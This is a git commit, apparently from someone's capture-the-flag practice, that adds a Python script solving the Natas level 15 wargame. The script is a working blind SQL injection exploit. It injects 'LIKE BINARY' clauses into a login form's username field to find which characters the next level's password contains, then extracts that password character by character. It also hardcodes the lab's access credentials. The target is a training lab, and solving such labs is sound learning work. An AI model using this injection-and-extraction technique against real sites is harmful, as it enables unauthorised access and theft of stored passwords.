fad20543df9522ea0414467826233b74004ca2a9
root <root@localhost.localdomain>
2017-12-13 09:45:38 -0500

    natas15!

---
+++ natas/natas15.py
@@ -0,0 +1,25 @@
+#!/usr/bin/env python
+import requests
+
+url='http://natas15.natas.labs.overthewire.org/index.php?debug'
+chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+#all chars whitch can be 
+filtered=''
+passwd=''
+auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
+for char in chars:
+	Data={'username':'natas16" and password LIKE BINARY "%' + char +'%" #'}
+	#LIKE simple pattern matching for binary string
+	r = requests.post(url, auth=auth, data = Data)
+	if 'exists' in r.text :
+	#catch is returning text containts text "exist" witch shows result is true
+        	filtered = filtered + char
+print filtered
+for i in range(0,32):
+	for char in filtered:
+        	Data={'username':'natas16" and password LIKE BINARY "' + passwd + char +'%" #'}
+                r = requests.post(url, auth=auth, data = Data)
+        	if 'exists' in r.text :
+			passwd = passwd + char
+			print(passwd)
+			break
